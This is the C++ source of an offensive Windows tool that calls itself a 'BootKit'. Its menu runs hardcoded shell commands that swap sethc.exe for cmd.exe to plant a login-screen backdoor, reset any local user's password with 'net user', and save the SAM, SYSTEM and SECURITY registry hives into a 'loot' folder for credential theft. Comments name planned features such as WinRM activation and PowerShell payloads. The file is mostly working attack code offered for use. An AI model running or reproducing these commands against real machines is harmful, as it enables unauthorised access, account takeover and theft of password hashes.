// Import library/module
#include <iostream>
#include "module/termcolor.hpp"
// Set namespaces
using namespace std;
using namespace termcolor;


// Set variable 
string banner = "-------------------------------------\n ______              _ _    _ _      \n(____  \\            | | |  / |_)_    \n ____)  ) ___   ___ | | | / / _| |_  \n|  __  ( / _ \\ / _ \\| | |< < | |  _) \n| |__)  ) |_| | |_| | | | \\ \\| | |__ \n|______/ \\___/ \\___/|_|_|  \\_)_|\\___)\n\nBy Perrtatter\nhttps://github.com/Perrtatter/Windows-BootKitn\n-------------------------------------";
string bin_path = "C:\\Windows\\System32";
string choice;
bool running = true;

// Clear screen fonction
int clear_screen(){

    // Run command
    system("cls");

    // Return 0 , cause is a int loop
    return 0;
};

// Main loop
int main(){

    // Print banner
	cout << red << banner << reset << endl;

    // Ask for change binary path
    cout << "[" << yellow << "!" << reset << "] Bin path is : " << yellow << bin_path << reset << ", would you change it (y/n) > ";
    cin >> choice ;


    if (choice == "y"){
        // Ask for change binary path
        cout << "[" << magenta << "+" << reset << "] Enter your new binary path (" << magenta << "X:/xxxxx/xxxxxx" << reset << " ) > " ;
        cin >> bin_path ;
    }

    else{
        // Pass
        ;
    }
    
    // Clear terminal and reprint banner
    clear_screen();
    cout << red << banner << reset << endl;

    // Print choice menu
    cout << "[" << red << "1" << reset << "] Replace sethc.exe to cmd.exe" << endl;
    cout << "[" << red << "2" << reset << "] List user" << endl;
    cout << "[" << red << "3" << reset << "] Change password" << endl;
    cout << "[" << red << "4" << reset << "] Dump SAM base" << endl;
    // Intercative shell 
    // Download file in to usb key
    // Upload file to the machine 
    // Active WinRM
    // Replace "sethc.exe" to "bootkit-v1.4.exe" 
    // Run Powershell payload ( from keys )

    cout << "-------------------------------------" << endl;
    cout << "[" << red << "0" << reset << "] Save change ( exit with 'shutdown -h' )" << endl;

    // Jump line 
    cout << endl;

    while (running){
        // Choice option
        cout << "[" << magenta << "+" << reset << "] Enter your option > ";
        cin >> choice;

        if (choice == "1"){
            // Replace sethc.exe to cmd.exe
            string payload = "move " + bin_path + "\\sethc.exe " + bin_path + "\\sethc.exe.bak && copy " + bin_path + "\\cmd.exe " + bin_path + "\\sethc.exe";
            system(payload.c_str());

            // Show success message 
            cout << "[" << green << "*" << reset << "] Payload runned successfully" << endl;
        }

        else if (choice == "2"){
            // List user
            string payload = bin_path + "\\net user";
            system(payload.c_str());
            cout << "[" << green << "*" << reset << "] Payload runned successfully" << endl;
        }

        else if (choice == "3"){
            // Ask for username
            string username;
            cout << "[" << magenta << "+" << reset << "] Enter your target user ( use option 2 for list user ) > ";
            cin >> username;

            // Ask for password
            string password;
            cout << "[" << magenta << "+" << reset << "] Enter your new password > ";
            cin >> password;

            // Change password
            string payload = bin_path + "\\net user " + username + " " + password;
            system(payload.c_str());
            
            // Show success message 
            cout << "[" << green << "*" << reset << "] Payload runned successfully" << endl;
        }

        else if (choice == "4"){
            // Dump SAM base
            string payload = "@echo off && cd loot && mkdir %USERNAME%_base_sam && cd %USERNAME%_base_sam >NUL 2>&1 && reg save hklm\\sam ./sam.save && reg save hklm\\system ./system.save && reg save hklm\\security ./security.save ";
            system(payload.c_str());

            // Show loot export success message 
            cout << "[" << blue << "*" << reset << "] Loot exfiltrate as : " << blue << "'/loot/[PC-USERNAME]'" << reset << endl;

            // Show success message 
            cout << "[" << green << "*" << reset << "] Payload runned successfully" << endl;
        }

        else if (choice == "0"){
            // Stop running
            running = false;
        }

        else {
            // Print error
            cout << "[" << red << "!" << reset << "] Invalide option" << endl;
        }

        // Jump line 
        cout << endl;

    }


    // Shutdwon PC
    string payload = bin_path + "\\shutdown -h";
    system(payload.c_str());

    // Return 0 , cause is a int loop
	return 0;

}